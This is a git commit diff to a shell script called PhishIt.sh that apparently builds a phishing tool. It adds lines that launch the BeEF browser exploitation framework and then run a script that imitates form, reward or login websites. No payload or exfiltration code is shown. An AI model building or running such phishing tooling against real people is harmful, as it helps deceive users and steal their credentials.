87492c6350998c4d8120c52cc0c5dfabb6b9d9b9
fastfir <95661133+fastfir@users.noreply.github.com>
2022-12-05 22:22:19 -0800

    Basic interaction

--- PhishIt.sh
+++ PhishIt.sh
@@ -3,4 +3,8 @@ echo "\______   \  |__ |__| _____|  |__ |   |/  |_ "
 echo " |     ___/  |  \|  |/  ___/  |  \|   \   __\ "
 echo " |    |   |   Y  \  |\___ \|   Y  \   ||  | " 
 echo " |____|   |___|  /__/____  >___|  /___||__| " 
-
+cd beef
+sudo ./beef
+echo "What kind of website would you like to imitate? (form,reward,login)"
+read $type;
+python3 ImitateWebsite.py
